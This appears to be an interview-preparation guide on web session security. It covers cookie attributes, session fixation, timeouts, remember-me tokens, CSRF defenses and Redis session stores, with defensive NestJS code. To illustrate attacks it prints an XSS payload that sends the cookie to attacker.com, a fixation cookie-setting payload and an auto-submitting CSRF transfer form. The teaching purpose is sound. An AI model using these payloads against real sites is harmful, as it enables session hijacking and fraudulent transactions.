# Security (Authentication): Session Management — Secure Cookies & Session Fixation — Interview Q&A (5 YOE Level)

---

## Section 1: Session Fundamentals

**Q1. What is a session, and why does HTTP need session management at all?**
A: HTTP is a stateless protocol — every request is independent with no inherent memory of previous requests. A session is the mechanism that imposes statefulness on top of this: a server-side record that links a sequence of HTTP requests to a single authenticated user. Without sessions, users would have to re-authenticate on every single request.

Sessions work by issuing a session identifier (session ID) to the client after authentication. The client presents this ID on every subsequent request (via a cookie, header, or URL parameter). The server looks up the ID, retrieves the associated session data (user ID, roles, last activity, CSRF token), and continues the interaction as if it had memory of the prior exchanges.

The session ID is a *capability token* — whoever holds it can act as the associated user. This makes it the single most valuable credential in a web application: more valuable than the password (a leaked password can be changed; a valid session token grants immediate access without knowing the password at all). The entire security of session management flows from keeping this token secret, unforgeable, and short-lived.

**Q2. What are the core properties a session ID must have to be secure?**
A: Four properties, mirroring the API key requirements but with web-specific constraints:

1. **High entropy** — generated from a CSPRNG, minimum 128 bits (16 bytes), preferably 256 bits. A session ID with only 64 bits of entropy has `2^64 ≈ 18 quintillion` possible values — sounds large, but at internet scale with millions of concurrent sessions, birthday-paradox collision probability becomes non-trivial. OWASP recommends at least 128 bits.

2. **Unpredictability** — no sequential component, no timestamp, no user ID embedded in the session ID. An attacker who observes 1,000 session IDs must gain zero information about the next one.

3. **Sufficient length for the encoding** — 128 bits → 32 hex chars or 22 base64url chars. 256 bits → 64 hex chars or 43 base64url chars.

4. **No semantic content** — the session ID itself must reveal nothing about the user, their role, or session data. All meaning lives server-side in the session store. JWTs stored as session cookies violate this — they embed decodable claims, exposing user data to anyone who captures the cookie.

**Q3. What are the two main session architectures, and what are the trade-offs?**
A:
- **Server-side sessions** — the session ID is an opaque random token. All session data (user ID, roles, expiry, CSRF token) lives in a server-side store (Redis, database, in-memory). Verification requires a store lookup on every request. Supports instant revocation (delete the store entry). Scales horizontally if the store is shared (Redis cluster). State is not exposed to the client.

- **Client-side sessions (stateless tokens)** — all session data is encoded into the token itself (typically a signed JWT). The server verifies the signature on every request — no store lookup. Scales effortlessly (no shared state). But: no instant revocation (must wait for expiry or maintain a denylist, which reintroduces server-side state), token size increases as claims grow, and token contents are readable by the client (base64-decoded payload).

For fintech applications: server-side sessions with Redis are strongly preferred. Instant revocation is non-negotiable when a user reports a compromised device, when fraud is detected, or when an admin terminates a session. The extra Redis lookup (~1ms) is an acceptable cost. Stateless JWTs are appropriate for service-to-service auth (no user concept to revoke), not for user session management in regulated applications.

## Section 2: Cookie Attributes — HttpOnly, Secure, SameSite

**Q4. What does the `HttpOnly` cookie attribute do, and what attack does it prevent?**
A: `HttpOnly` is a flag on the `Set-Cookie` response header that instructs the browser to deny JavaScript access to the cookie. The cookie is still sent on every matching HTTP request, but it is not accessible via `document.cookie`, `document.cookies`, or any JavaScript API.

```http
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

The attack it prevents is **Cross-Site Scripting (XSS) session hijacking**. Without `HttpOnly`, a successful XSS attack can extract the session cookie:
```js
// XSS payload — exfiltrates session cookie to attacker's server
fetch(`https://attacker.com/steal?c=${document.cookie}`);
```
With `HttpOnly` set, `document.cookie` does not contain the session cookie — the browser refuses to expose it to JavaScript. The attacker's XSS payload has nothing to steal.

`HttpOnly` does *not* prevent: the cookie from being sent on requests (including forged requests in CSRF attacks), network-level interception (that's `Secure`'s job), or XSS attacks that don't aim to steal the cookie (e.g., XSS that makes authenticated requests directly from the victim's browser — `HttpOnly` stops cookie theft but not in-browser exploitation).

**Q5. What does the `Secure` cookie attribute do, and when is it insufficient on its own?**
A: `Secure` instructs the browser to transmit the cookie only over HTTPS connections — never over HTTP. A session cookie with `Secure` set will not be sent if the browser is talking to an HTTP endpoint, even on the same domain.

```http
Set-Cookie: session_id=abc123; Secure; HttpOnly; ...
```

The attack it prevents is **network interception (man-in-the-middle)**. On an unencrypted HTTP connection, any network observer (public Wi-Fi, ISP, malicious router) can read cookie values in plaintext. `Secure` ensures the cookie only travels over encrypted TLS connections.

Where it's insufficient on its own: if your application serves *any* HTTP content on the same domain (even a redirect), certain attacks can still intercept cookies:
- **SSL stripping** — an attacker intercepts the initial HTTP request before the redirect to HTTPS fires, capturing cookies sent on that first plain HTTP request. Mitigation: HTTP Strict Transport Security (HSTS) tells browsers to *only* make HTTPS connections to your domain, so the plain HTTP request never goes out.
- **Cookie forcing via HTTP subdomain** — if `http://sub.example.com` is HTTP, an attacker can set a cookie on `.example.com` that overrides the secure cookie on `https://example.com`. Mitigation: use `__Secure-` cookie name prefix (discussed in Q8).
- **Mixed content** — any HTTP resource loaded by an HTTPS page can trigger cookie exposure. Enforce Content Security Policy to block mixed content.

**Q6. What does `SameSite` do, and what are the differences between `Strict`, `Lax`, and `None`?**
A: `SameSite` controls whether the browser sends the cookie on cross-site requests — requests where the *site* (registrable domain) of the request origin differs from the cookie's domain. It's the primary browser-enforced defense against **Cross-Site Request Forgery (CSRF)**.

```http
Set-Cookie: session_id=abc123; SameSite=Lax; Secure; HttpOnly
```

**`SameSite=Strict`** — the cookie is *never* sent on cross-site requests, including navigations. If a user clicks a link on `evil.com` that goes to `yourbank.com`, the cookie is not sent — the user lands on the bank as if unauthenticated, even though they have a session. Maximum CSRF protection but breaks legitimate cross-site navigation flows (OAuth redirects, email links that land users on authenticated pages).

**`SameSite=Lax`** (modern browser default) — the cookie is sent on cross-site *top-level navigations* using safe HTTP methods (GET, HEAD) but not on cross-site subrequests (XHR, fetch, img src, form POST). Clicking a link from `evil.com` to `yourbank.com` sends the cookie; `evil.com` submitting a POST form to `yourbank.com` does not. This is the right default for most applications — it protects against CSRF while allowing email links and OAuth to work.

**`SameSite=None`** — the cookie is sent on all cross-site requests. *Must* be paired with `Secure`. Required for legitimate cross-site use cases: a payment iframe embedded in a merchant's site, a widget that reads a logged-in state across sites, a third-party API that uses cookie auth. Chrome blocks `SameSite=None` without `Secure` since Chrome 80.

For session cookies on a typical web app: use `SameSite=Lax`. For admin panels and high-security internal tools: use `SameSite=Strict`. For any embedded/cross-origin widget: `SameSite=None; Secure` with explicit CSRF tokens.

**Q7. Does `SameSite=Lax` or `SameSite=Strict` make CSRF tokens unnecessary?**
A: Mostly yes for modern browsers — but not entirely, for two reasons:

1. **Browser support and legacy clients** — `SameSite` defaults were inconsistent before Chrome 80 (2020) and Safari 12 (2018). Older browsers and some mobile WebViews may not enforce `SameSite`. If your threat model includes legacy clients, CSRF tokens remain necessary.

2. **`SameSite` is a browser enforcement mechanism** — it can be bypassed by non-browser clients (curl, custom HTTP clients, native mobile apps) that send cookies but ignore SameSite semantics. If your session cookie is accessible outside a browser context (e.g., a hybrid app using a native HTTP client), SameSite doesn't apply.

3. **Scheme-level cross-site** — Chrome's definition of "same-site" includes the scheme (HTTP vs HTTPS). `http://example.com` and `https://example.com` are cross-site under this definition. Edge cases with mixed scheme deployments can be surprising.

The OWASP recommendation: use `SameSite=Lax` (or `Strict`) *and* CSRF tokens as defense-in-depth. `SameSite` is the primary mitigation; CSRF tokens are the fallback for legacy clients and non-browser contexts. Drop neither — the cost of both is low and the defense-in-depth benefit is real.

**Q8. What are cookie name prefixes (`__Secure-` and `__Host-`), and when should you use them?**
A: Cookie name prefixes are a browser-enforced naming convention that makes certain security attributes mandatory. If the browser receives a cookie with these prefixes but without the required attributes, it rejects the cookie entirely.

**`__Secure-`** — requires `Secure` attribute. The cookie cannot be set or read over HTTP:
```http
Set-Cookie: __Secure-session_id=abc123; Secure; HttpOnly; SameSite=Lax
```

**`__Host-`** — the most restrictive prefix. Requires: `Secure`, no `Domain` attribute (so it can't be shared with subdomains), and `Path=/`. Effectively scopes the cookie to the exact origin:
```http
Set-Cookie: __Host-session_id=abc123; Secure; HttpOnly; SameSite=Lax; Path=/
```

Why this matters: without `__Host-`, an attacker who can set cookies on a subdomain (`http://attacker.example.com`, perhaps via a subdomain takeover) can inject a session cookie for `.example.com`, overwriting or interfering with the legitimate session cookie. With `__Host-`, the browser enforces that only the exact HTTPS origin can set and receive the cookie — subdomain injection is structurally impossible.

Use `__Host-` for session cookies in any application where you control the full origin. Use `__Secure-` for cookies that legitimately need to span subdomains. In a fintech app: `__Host-session` for the user session, `__Secure-csrf` for a CSRF token that spans subdomains.

**Q9. What are `Max-Age` and `Expires` on cookies, and how do they interact with session security?**
A: `Max-Age` (seconds from now) and `Expires` (absolute UTC datetime) control cookie persistence. A cookie with neither attribute is a **session cookie** — it lives only in browser memory and is deleted when the browser closes. A cookie with `Max-Age` or `Expires` is a **persistent cookie** — stored on disk, survives browser restarts.

```http
# Session cookie (deleted on browser close)
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/

# Persistent cookie (survives browser close for 1 hour)
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
```

Security trade-offs:
- **Session cookies** (no `Max-Age`) — less risk of a stolen device exposing long-lived credentials. On public/shared computers, the session ends when the browser closes. But users lose their session every time they close the browser — poor UX for daily-use apps.
- **Persistent cookies** — survive browser restarts, better UX. But they're stored on disk — a stolen or compromised device exposes the cookie until it expires. The solution: keep `Max-Age` short (15–30 minutes for high-security, 1–7 days for typical apps) and implement server-side **sliding expiry** (reset the TTL on every authenticated request). The cookie itself may have a long `Max-Age` but the server-side session expires after inactivity.

For fintech: use persistent cookies with a `Max-Age` of 24 hours, but enforce a **server-side idle timeout** (e.g., 15–30 minutes of inactivity invalidates the session in Redis). The long `Max-Age` prevents the cookie from disappearing mid-session; the server-side timeout provides the actual security boundary.

## Section 3: Session Fixation Attacks

**Q10. What is a session fixation attack, and what's the attack sequence?**
A: Session fixation is an attack where the attacker *supplies* the session ID to the victim rather than stealing one the victim already has. The attacker exploits the fact that some applications allow a session ID presented by the client to be used as-is, without regenerating it on authentication.

**Attack sequence:**

```
Step 1 — Attacker obtains a valid (unauthenticated) session ID:
  Attacker visits https://yourbank.com → server creates a pre-auth session:
  Set-Cookie: session_id=ATTACKER_KNOWN_ID
  The session exists on the server but is not yet authenticated.

Step 2 — Attacker fixes the victim's session to this known ID:
  Method A (cookie injection via URL, for apps that read session from URL):
    Attacker sends victim: https://yourbank.com?session_id=ATTACKER_KNOWN_ID
    App reads session from URL, sets cookie: session_id=ATTACKER_KNOWN_ID

  Method B (subdomain cookie injection):
    Attacker controls http://sub.yourbank.com (via subdomain takeover)
    Sets: Set-Cookie: session_id=ATTACKER_KNOWN_ID; Domain=.yourbank.com

  Method C (XSS to set the cookie):
    XSS payload: document.cookie = "session_id=ATTACKER_KNOWN_ID"

Step 3 — Victim authenticates with the fixed session ID:
  Victim logs in at https://yourbank.com.
  App authenticates the victim but reuses the existing session ID (ATTACKER_KNOWN_ID)
  and simply adds user identity to it.

Step 4 — Attacker uses the now-authenticated session:
  Attacker sends requests with session_id=ATTACKER_KNOWN_ID.
  Server looks up the session → finds it is now authenticated as the victim.
  Attacker is now logged in as the victim without ever knowing their password.
```

The critical vulnerability is in Step 3: the application authenticated the user but did *not* regenerate the session ID. The pre-authentication session became a post-authentication session with the same ID.

**Q11. What is the complete, correct defense against session fixation?**
A: The primary defense is **session ID regeneration on every privilege change** — particularly on login (the most common privilege change):

```typescript
// auth.service.ts — NestJS with express-session
async login(req: Request, user: AuthenticatedUser): Promise<void> {
  // At this point, req.session exists but is unauthenticated.
  // The session ID may have been supplied by or known to an attacker.

  // Step 1: Capture any pre-auth session data worth preserving
  const preAuthData = {
    returnUrl:   req.session.returnUrl,
    cartId:      req.session.cartId,
  };

  // Step 2: Regenerate the session ID — this is the fixation defense
  await new Promise<void>((resolve, reject) => {
    req.session.regenerate((err) => {
      if (err) reject(err);
      else resolve();
    });
  });
  // After regenerate(): req.session is a NEW session with a NEW ID.
  // The old session (with the attacker's known ID) is destroyed.

  // Step 3: Populate the new session with auth data
  req.session.userId    = user.id;
  req.session.roles     = user.roles;
  req.session.loginAt   = new Date().toISOString();
  req.session.csrfToken = generateCsrfToken();

  // Restore pre-auth data if needed
  Object.assign(req.session, preAuthData);

  // Step 4: Save explicitly before responding
  await new Promise<void>((resolve, reject) => {
    req.session.save((err) => {
      if (err) reject(err);
      else resolve();
    });
  });
}
```

Also regenerate on other privilege changes:
- **Privilege escalation within a session** — e.g., a user switches from a read-only role to an admin role mid-session.
- **Password change** — regenerate and optionally invalidate all other sessions for that user.
- **MFA completion** — the session goes from "password verified" to "fully authenticated"; regenerate at this boundary too (the challenge-token pattern from the MFA guide addresses this).
- **Logout** — destroy the session entirely, including the server-side record.

**Q12. What's the difference between session regeneration and session invalidation?**
A:
- **Regeneration** (`req.session.regenerate()`) — creates a *new* session with a *new* session ID, carrying over selected data from the old session. The old session is destroyed. Used at login, privilege changes, and MFA step completion. The user stays "in" their interaction; they just get a fresh, unforgeable session ID.
- **Invalidation / destruction** (`req.session.destroy()`) — destroys the current session and deletes it from the store. Used at logout. The user must re-authenticate to get a new session. In a Redis-backed store, the session key is deleted — any request presenting the old session ID finds no matching session and is treated as unauthenticated.

```typescript
// Correct logout implementation
async logout(req: Request, res: Response): Promise<void> {
  const sessionId = req.session.id;

  // Step 1: Destroy server-side session (removes from Redis)
  await new Promise<void>((resolve, reject) => {
    req.session.destroy((err) => {
      if (err) reject(err);
      else resolve();
    });
  });

  // Step 2: Clear the cookie on the client — set it expired
  // Without this, the browser still holds the old cookie value,
  // and while the server no longer recognizes it, it's tidier to clear it.
  res.clearCookie('__Host-session', {
    secure:   true,
    httpOnly: true,
    sameSite: 'lax',
    path:     '/',
  });

  // Step 3: Audit log
  await this.auditLog.record({ event: 'logout', sessionId });

  res.redirect('/login');
}
```

**Q13. How does session fixation interact with cookie-based sessions vs. URL-based sessions?**
A: URL-based sessions — where the session ID appears in the URL as a query parameter (`?session_id=abc`) or path segment — are inherently more vulnerable to fixation because:
- The session ID is trivially injectable by an attacker via a crafted link (Step 2, Method A in Q10) — no XSS or subdomain takeover needed, just a URL with the attacker's known session ID.
- The session ID is logged in server access logs, browser history, and the `Referer` header of outgoing links.
- Session IDs in URLs violate the `Secure` cookie model entirely — TLS encrypts the channel but the session ID is still in plaintext in logs.

URL-based session tracking was common in pre-2005 PHP applications and some Java frameworks (JSESSIONID in URL). It should never be used in new applications. Always use cookies. If you must support a legacy URL-based session, at minimum: never accept session IDs from URLs once a user has authenticated (accept only from cookies post-login), and regenerate the session ID on login.

## Section 4: Session Lifecycle Management

**Q14. How do you implement idle timeout and absolute timeout, and why are both necessary?**
A: Two distinct timeout mechanisms serve different security goals:

**Idle timeout** — expires a session after a period of inactivity. Protects against unattended sessions (user walks away from their desk logged into your banking app). Implemented by tracking `last_activity_at` in the session store and checking it on every request:

```typescript
// session.middleware.ts
@Injectable()
export class SessionTimeoutMiddleware implements NestMiddleware {
  private readonly IDLE_TIMEOUT_SECONDS = 900;  // 15 minutes

  async use(req: Request, res: Response, next: NextFunction): Promise<void> {
    if (!req.session?.userId) return next();  // unauthenticated, skip

    const now         = Date.now();
    const lastActivity = req.session.lastActivity ?? 0;

    if (now - lastActivity > this.IDLE_TIMEOUT_SECONDS * 1000) {
      // Session idle-expired — destroy and reject
      await new Promise<void>(r => req.session.destroy(() => r()));
      res.clearCookie('__Host-session', { secure: true, httpOnly: true, path: '/' });
      return res.status(401).json({ code: 'SESSION_EXPIRED', message: 'Session timed out' });
    }

    // Slide the window — update last activity
    req.session.lastActivity = now;
    next();
  }
}
```

**Absolute timeout** — expires a session regardless of activity, after a fixed wall-clock time since login. Protects against long-running compromised sessions (a session token stolen and held by an attacker is automatically invalidated). Implemented by tracking `loginAt` in the session:

```typescript
const ABSOLUTE_TIMEOUT_SECONDS = 28800;  // 8 hours max session length

if (now - req.session.loginAt > ABSOLUTE_TIMEOUT_SECONDS * 1000) {
  // Force re-authentication even if the user has been active
  await new Promise<void>(r => req.session.destroy(() => r()));
  return res.status(401).json({ code: 'SESSION_ABSOLUTE_EXPIRED' });
}
```

Both are necessary: idle timeout catches abandoned sessions; absolute timeout ensures no session lives forever even under continuous use. RBI guidelines for banking applications typically require absolute timeouts of 5–8 hours and idle timeouts of 5–15 minutes.

**Q15. How do you implement "remember me" functionality without compromising session security?**
A: "Remember me" is a request for a long-lived credential that survives browser restarts. The wrong implementation: make the session cookie persistent with `Max-Age=30d`. This extends the session indefinitely, defeating idle timeouts and creating a long-lived token with no additional security.

The correct implementation uses a separate **remember-me token** mechanism, decoupled from the session:

```typescript
// On login with "remember me" checked:
async loginWithRememberMe(userId: string, res: Response): Promise<void> {
  // 1. Issue a normal short-lived session (15-min idle timeout)
  //    (via the standard session creation flow)

  // 2. Generate a separate, long-lived remember-me token
  const selector = crypto.randomBytes(16).toString('hex');  // 32 hex chars
  const validator = crypto.randomBytes(32).toString('hex'); // 64 hex chars — stored hashed

  // Store: selector (plaintext for lookup) + hash(validator) + userId + expiry
  await this.db.rememberTokens.insert({
    selector,
    validator_hash: crypto.createHash('sha256').update(validator).digest('hex'),
    user_id:        userId,
    expires_at:     addDays(new Date(), 30),
  });

  // 3. Issue a persistent cookie containing selector:validator
  //    The cookie is long-lived; the server-side session is short-lived
  res.cookie('__Secure-remember', `${selector}:${validator}`, {
    secure:   true,
    httpOnly: true,
    sameSite: 'lax',
    maxAge:   30 * 24 * 60 * 60,  // 30 days
    path:     '/',
  });
}

// On subsequent visit (no active session, but remember-me cookie present):
async resumeFromRememberMe(rememberCookie: string, req: Request): Promise<void> {
  const [selector, validator] = rememberCookie.split(':');
  if (!selector || !validator) return;

  const record = await this.db.rememberTokens.findOne({ selector });

  if (!record || record.expires_at < new Date()) return;  // not found or expired

  const validatorHash = crypto.createHash('sha256').update(validator).digest('hex');
  const isValid = crypto.timingSafeEqual(
    Buffer.from(validatorHash, 'hex'),
    Buffer.from(record.validator_hash, 'hex'),
  );

  if (!isValid) {
    // Hash mismatch — possible token theft. Invalidate all remember-me tokens for this user.
    await this.db.rememberTokens.delete({ user_id: record.user_id });
    return;
  }

  // Rotate the token — prevents long-term token reuse
  await this.db.rememberTokens.delete({ selector });
  // Issue a new session and new remember-me token for the user
  await this.createSession(record.user_id, req);
  await this.loginWithRememberMe(record.user_id, req.res!);
}
```

The selector/validator split (popularized by Charles Miller's work on persistent login) is critical: the selector is a plaintext lookup key (not secret); the validator is the secret half, stored hashed. An attacker who reads the database gets hashed validators — they can't reconstruct the cookie without cracking them. A timing attack on the selector lookup is harmless (selector is not secret). If the validator hash doesn't match, all remember-me tokens for that user are invalidated (compromise detection).

**Q16. How do you handle concurrent sessions — should users be allowed multiple active sessions?**
A: Whether to allow concurrent sessions is a product and security policy decision with real trade-offs:

**Allow multiple sessions (default for most consumer apps):**
The user is logged in on their phone, their laptop, and their tablet simultaneously — all valid. Each device has its own session ID in the session store. Logout on one device destroys only that session. Implementation: no special logic required — each login creates an independent session.

**Single active session (high-security or explicit policy):**
When a new login occurs, all existing sessions for that user are invalidated. Prevents an attacker who stole a session from retaining access after the user re-authenticates. Implementation requires tracking all session IDs per user:

```typescript
// Redis: maintain a set of active session IDs per user
async createSession(userId: string, sessionId: string): Promise<void> {
  await this.redis.sadd(`user:sessions:${userId}`, sessionId);
  // Also set the session data at the session key
}

async invalidateAllSessions(userId: string): Promise<void> {
  const sessionIds = await this.redis.smembers(`user:sessions:${userId}`);
  for (const id of sessionIds) {
    await this.redis.del(`sess:${id}`);  // express-session key format
  }
  await this.redis.del(`user:sessions:${userId}`);
}

// On new login — call invalidateAllSessions(userId) before creating the new session
```

**"Sessions" dashboard (best practice for fintech):** allow multiple sessions but show the user a list of active sessions (device, browser, IP, last activity, location). Allow the user to revoke any individual session. This is what Google, GitHub, and most banks do — it provides transparency and control without forcing single-session constraints that hurt UX.

## Section 5: CSRF and the Complete Cookie Security Stack

**Q17. How does CSRF work, and how does it interact with session cookies?**
A: CSRF (Cross-Site Request Forgery) exploits the fact that browsers automatically attach cookies (including session cookies) to every request matching the cookie's domain and path, regardless of which site initiated the request.

**Attack sequence:**
```
1. Victim is authenticated at https://loans.example.com
   Their browser holds: __Host-session=VICTIM_SESSION (sent on all requests to loans.example.com)

2. Victim visits https://evil.com (in another tab)
   evil.com serves this HTML:
   <form action="https://loans.example.com/transfer" method="POST" id="f">
     <input name="amount" value="50000">
     <input name="account" value="ATTACKER_ACCOUNT">
   </form>
   <script>document.getElementById('f').submit();</script>

3. The browser submits the POST to loans.example.com.
   The browser automatically includes the session cookie.
   loans.example.com receives a valid authenticated request — it can't tell this
   wasn't initiated by the user's own interaction.

4. The transfer executes. The victim loses ₹50,000.
```

The defense layers:
1. **`SameSite=Lax`** — blocks the cross-site POST (form submissions from other origins don't include the cookie). This alone defeats the example above.
2. **CSRF token** — a per-session, per-form secret token that must be included in state-changing requests. The attacker's page can't read the token (same-origin policy) so can't forge a request that includes it.
3. **`Origin` / `Referer` header checking** — the server rejects requests whose `Origin` or `Referer` doesn't match the expected domain. Simple to implement, works for most cases (some proxies strip `Referer`).
4. **Double-submit cookie pattern** — for stateless CSRF protection: set a random value in a non-`HttpOnly` cookie and require the same value in a request header; JavaScript can read the non-`HttpOnly` cookie and include it, but cross-site requests can't (same-origin policy restricts JS from reading cookies of other origins).

**Q18. How do you implement CSRF tokens in a NestJS application?**
A:
```typescript
// csrf.middleware.ts — sets a CSRF token in the session and a readable cookie
@Injectable()
export class CsrfMiddleware implements NestMiddleware {
  use(req: Request, res: Response, next: NextFunction): void {
    if (!req.session?.userId) return next();  // unauthenticated, skip

    // Generate a CSRF token if not already in the session
    if (!req.session.csrfToken) {
      req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    }

    // Set a readable (non-HttpOnly) cookie so the frontend SPA can read it
    // This is the double-submit pattern — the cookie is same-origin readable
    res.cookie('XSRF-TOKEN', req.session.csrfToken, {
      secure:   true,
      httpOnly: false,   // intentionally readable by JS
      sameSite: 'lax',
      path:     '/',
    });

    next();
  }
}

// csrf.guard.ts — validates CSRF token on state-changing requests
@Injectable()
export class CsrfGuard implements CanActivate {
  private readonly SAFE_METHODS = new Set(['GET', 'HEAD', 'OPTIONS']);

  canActivate(context: ExecutionContext): boolean {
    const req = context.switchToHttp().getRequest<Request>();

    if (this.SAFE_METHODS.has(req.method)) return true;  // read-only, skip

    const sessionToken  = req.session?.csrfToken;
    const headerToken   = req.headers['x-xsrf-token'] as string;
    const bodyToken     = req.body?.['_csrf'];

    const submitted = headerToken ?? bodyToken;
    if (!sessionToken || !submitted) return false;

    // Constant-time comparison
    return crypto.timingSafeEqual(
      Buffer.from(sessionToken, 'hex'),
      Buffer.from(submitted,    'hex'),
    );
  }
}
```

The frontend (Angular's `HttpClient`, Axios with `withCredentials`) automatically reads the `XSRF-TOKEN` cookie and includes it as the `X-XSRF-Token` header on state-changing requests. This is the standard Angular/Rails/Django CSRF pattern.

**Q19. What is the full recommended `Set-Cookie` header for a production session cookie, and what does each attribute do?**
A:
```http
Set-Cookie: __Host-session=<256-bit-base64url>; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400
```

Attribute-by-attribute:

| Attribute | Value | Purpose |
|---|---|---|
| Cookie name | `__Host-session` | `__Host-` prefix enforces Secure, no Domain, Path=/ at browser level |
| Cookie value | 256-bit base64url | 43 URL-safe chars, CSPRNG-generated, full entropy |
| `Secure` | (flag) | HTTPS-only transmission; required by `__Host-` prefix |
| `HttpOnly` | (flag) | No JS access; blocks XSS cookie theft |
| `SameSite=Lax` | Lax | Blocks cross-site POST CSRF; allows top-level navigations |
| `Path=/` | / | Required by `__Host-` prefix; cookie sent on all paths |
| `Max-Age=86400` | 86400 | Cookie persists 24h (client-side); actual expiry enforced server-side |

What this header does *not* do: enforce idle timeout (that's Redis TTL), prevent XSS exploitation that makes authenticated requests without stealing the cookie (that's CSP's job), or provide CSRF protection on its own for all browsers (that's why CSRF tokens are also present).

## Section 6: Secure Session Store, Redis, and Real-World Scenarios

**Q20. How do you configure a production-grade Redis-backed session store in NestJS/Express?**
A:
```typescript
// main.ts
import session from 'express-session';
import RedisStore from 'connect-redis';
import { createClient } from 'redis';

const redisClient = createClient({
  socket: {
    host: process.env.REDIS_HOST,
    port: Number(process.env.REDIS_PORT),
    tls:  true,              // TLS to Redis — mandatory for cross-AZ traffic
  },
  password: process.env.REDIS_AUTH_TOKEN,
});
await redisClient.connect();

app.use(session({
  store: new RedisStore({
    client: redisClient,
    prefix: 'sess:',         // all session keys: "sess:<session_id>"
    ttl:    86400,           // max TTL in Redis (seconds) — belt-and-suspenders
  }),
  secret:            process.env.SESSION_SECRET!,   // used to sign the session ID cookie
  name:              '__Host-session',
  resave:            false,   // don't resave unchanged sessions
  saveUninitialized: false,   // don't create sessions for unauthenticated requests
  rolling:           true,    // reset Max-Age on every response (sliding expiry)
  cookie: {
    secure:   true,
    httpOnly: true,
    sameSite: 'lax',
    maxAge:   86400 * 1000,  // milliseconds for express
    path:     '/',
  },
  // Note: express-session doesn't natively support __Host- prefix in the name;
  // set the name field to '__Host-session' and verify it works in your Express version,
  // or set the cookie manually in the login handler via res.cookie()
}));
```

The `SESSION_SECRET` signs the session ID in the cookie (HMAC-SHA256) — even if an attacker guesses a session ID that exists in Redis, the cookie value they'd need to forge is `<session_id>.<signature>`. Without the secret, they can't produce a valid signature. Rotate this secret periodically; express-session supports an array of secrets for rotation (`secret: [newSecret, oldSecret]`).

**Q21. What happens to session security if the Redis session store goes down?**
A: With a properly configured Redis store (`saveUninitialized: false`), a Redis outage causes all session lookups to fail — every request appears unauthenticated. Depending on your error handling:

- **Fail closed (safer)** — if Redis is unreachable, return 503 and require the user to retry. No session data is accessible during the outage; no security boundary is weakened.
- **Fail open (dangerous)** — if your error handler falls through to "unauthenticated allowed," a Redis outage inadvertently opens your API. Never fail open on session validation errors.

Resilience measures:
1. **Redis Cluster / ElastiCache with Multi-AZ** — automatic failover keeps the session store available across AZ failures. Primary goes down → replica promoted within seconds.
2. **Session store circuit breaker** — if repeated Redis timeouts are detected, return 503 with a `Retry-After` header rather than hanging requests indefinitely.
3. **Absolute timeout in the cookie itself** — embed a `loginAt` timestamp in the session cookie value (not in Redis) — if Redis is down and the timestamp is expired, reject the session outright on recovery. Prevents stale sessions from being reinstated after a long outage.

**Q22. How do you implement "logout from all devices" (global session invalidation)?**
A:
```typescript
// Track all session IDs per user in a Redis set (from Q16)
// On "logout everywhere":
async logoutAllDevices(userId: string, currentSessionId: string): Promise<void> {
  const allSessionIds = await this.redis.smembers(`user:sessions:${userId}`);

  // Destroy all sessions in parallel
  await Promise.all(
    allSessionIds.map(id => this.redis.del(`sess:${id}`))
  );

  // Clear the tracking set
  await this.redis.del(`user:sessions:${userId}`);

  // Audit log
  await this.auditLog.record({
    event:      'logout_all_devices',
    userId,
    sessionCount: allSessionIds.length,
  });
}
```

For session-store implementations that don't support per-user session enumeration: add a `session_version` counter to the user record. Increment it on "logout all devices." Store the version at session creation time in the session data. On every request, check that `session.version === user.session_version` — if not, the session predates the logout-all and is invalid. This is the pattern used when you can't enumerate sessions by user ID.

```typescript
// In session middleware — check version
if (req.session.sessionVersion !== user.sessionVersion) {
  await new Promise<void>(r => req.session.destroy(() => r()));
  return res.status(401).json({ code: 'SESSION_INVALIDATED' });
}
```

**Q23. Scenario: "A user reports they were logged in as another user for a few seconds before the page refreshed to their own account. What session-management bug does this describe?"**
A: This is a **session cross-contamination** bug, typically caused by one of three mistakes:

**1. In-memory session store in a multi-process Node.js deployment** — if you're using the default in-memory store (`express-session` without a Redis store) behind a load balancer with multiple Node processes, session lookups hit different processes on each request. Process A created the session; request routes to Process B which has no memory of it; Process B either creates a new session or finds a stale one. This is why in-memory stores must never be used in production with multiple instances.

**2. Session store key collision** — if the session ID space is too small or the CSPRNG is seeded poorly, two users could (extremely rarely) receive the same session ID. One user's session lookup returns the other's data. Fix: ensure 128+ bits of entropy in session IDs (Q2).

**3. Race condition in session save** — if `saveUninitialized: true` and two concurrent unauthenticated requests arrive simultaneously for the same user, both create a session, and the second save overwrites the first — but the first response already sent back the first session ID. The next request with the first session ID finds the second session's data. Fix: `saveUninitialized: false` and atomic session creation.

**4. Incorrect session namespace / prefix** — two different applications sharing the same Redis instance with the same session key prefix. Application A's session ID `abc123` collides with Application B's session ID `abc123`. Fix: always use distinct `prefix` values per application.

**Q24. Scenario: "You're doing a security review of a legacy Node.js lending app. What session-related issues would you look for, and how would you prioritize fixing them?"**
A: Structured review checklist with priority:

**Critical (fix immediately):**
- [ ] Session IDs in URLs (`?session_id=`, `JSESSIONID=` in path) — trivial fixation, logs exposure.
- [ ] No session regeneration on login — session fixation vulnerability.
- [ ] `HttpOnly` absent — XSS can steal session cookies.
- [ ] `Secure` absent — cookies sent over HTTP; interceptable.
- [ ] In-memory session store in multi-process deployment — cross-contamination, data loss.
- [ ] No idle timeout — active sessions never expire.

**High (fix within sprint):**
- [ ] `SameSite` absent — CSRF attacks possible on older browsers.
- [ ] No CSRF tokens on state-changing endpoints — defense-in-depth missing.
- [ ] Session secret hardcoded or weak — trivial session forgery.
- [ ] No absolute timeout — sessions live forever under active use.
- [ ] Redis connection over plaintext — session store traffic interceptable.
- [ ] `saveUninitialized: true` — creates sessions for unauthenticated requests (Redis bloat, fixation surface).

**Medium (fix within quarter):**
- [ ] No `__Host-` or `__Secure-` prefix — subdomain cookie injection possible.
- [ ] No per-user session tracking — "logout all devices" impossible.
- [ ] No session event audit log — compliance gap for RBI/PCI-DSS.
- [ ] `Max-Age` too long without server-side idle enforcement — stale cookie risk.
- [ ] No rate limiting on login endpoint — brute force / credential stuffing.

**Low (track and plan):**
- [ ] Session secret not rotated — rotate with a transition period.
- [ ] No "active sessions" dashboard for users — transparency feature.
- [ ] No SIM-swap check for SMS-based session recovery.

